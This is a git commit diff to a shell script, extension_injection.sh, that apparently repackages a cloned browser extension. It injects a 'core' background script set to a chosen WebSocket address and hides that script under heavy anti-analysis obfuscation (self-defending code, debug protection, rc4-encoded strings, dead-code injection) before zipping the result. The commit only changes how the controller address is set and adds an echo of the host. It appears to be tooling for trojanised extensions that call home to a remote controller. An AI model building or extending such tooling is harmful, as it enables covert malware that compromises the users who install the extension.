23cddf0d7752ec0479fd6cc248d13fd505ff00e0
S045pd <22721729+s045pd@users.noreply.github.com>
2023-07-04 15:28:41 +0800

    Update extension_injection.sh

--- extension_injection.sh
+++ extension_injection.sh
@@ -12,10 +12,7 @@ target_file="$repository_name/$background_script"
 dst_json="$repository_name/manifest.json"
 zip_file="$repository_name-with-core.zip"
 zip_file_folder="$repository_name/"
-
-if [[ -z "$default_address" ]]; then
-    default_address="ws://127.0.0.1:4343"
-fi
+default_address="ws://127.0.0.1:4343"
 
 if [ ! -d "$destination_folder" ]; then
     git clone "$repository_url" "$destination_folder"
@@ -35,7 +32,11 @@ if ! command -v javascript-obfuscator &>/dev/null; then
     npm install --save-dev javascript-obfuscator -g
 fi
 
-read -r -p "Set Address($default_address): " new_address
+# 判断new_address 是否为空
+
+if [[ -z "$new_address" ]]; then
+    read -r -p "Set Address($default_address): " new_address
+fi
 
 if [ -n "$new_address" ]; then
     if [[ ! "$new_address" =~ ^(ws|wss):// ]]; then
@@ -47,6 +48,7 @@ else
 fi
 
 sed "s|$default_address|$new_address|g" "$source_file" >"$source_temp_file"
+echo "Host: $new_address"
 javascript-obfuscator "$source_temp_file" --output "$target_file" --compact true --control-flow-flattening true --control-flow-flattening-threshold 1 --dead-code-injection true --dead-code-injection-threshold 1 --debug-protection true --debug-protection-interval 4000 --disable-console-output true --identifier-names-generator hexadecimal --log false --numbers-to-expressions true --rename-globals true --self-defending true --simplify true --split-strings true --split-strings-chunk-length 5 --string-array true --string-array-calls-transform true --string-array-encoding rc4 --string-array-index-shift true --string-array-rotate true --string-array-shuffle true --string-array-wrappers-count 5 --string-array-wrappers-chained-calls true --string-array-wrappers-parameters-max-count 5 --string-array-wrappers-type function --string-array-threshold 1 --transform-object-keys true --unicode-escape-sequence false
 rm "$source_temp_file"
 rm -f "$zip_file"
